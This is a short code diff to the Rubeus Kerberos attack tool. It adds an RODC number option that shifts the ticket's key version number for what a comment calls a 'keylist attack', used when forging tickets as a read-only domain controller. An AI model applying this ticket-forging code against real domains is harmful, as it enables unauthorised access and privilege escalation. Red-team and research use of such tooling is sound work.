@@ -74,7 +74,8 @@ namespace Rubeus
             string s4uProxyTarget = null,
             string s4uTransitedServices = null,
             bool includeAuthData = false,
-            bool noFullPacSig = false
+            bool noFullPacSig = false,
+            Int32 rodcNumber = 0
             )
         {
             // vars
@@ -971,8 +972,15 @@ namespace Rubeus
                 // initialize the ticket and add the enc_part
                 Console.WriteLine("[*] Generating Ticket");
                 Ticket ticket = new Ticket(domain.ToUpper(), sname);
-                ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);
-
+                // when performing keylist attack the kvnum is shifted left 16 bits
+                if (rodcNumber == 0)
+                {
+                    ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);
+                }
+                else
+                {
+                    ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, (uint)rodcNumber << 16);
+                }
                 // add the ticket
                 cred.tickets.Add(ticket);
 
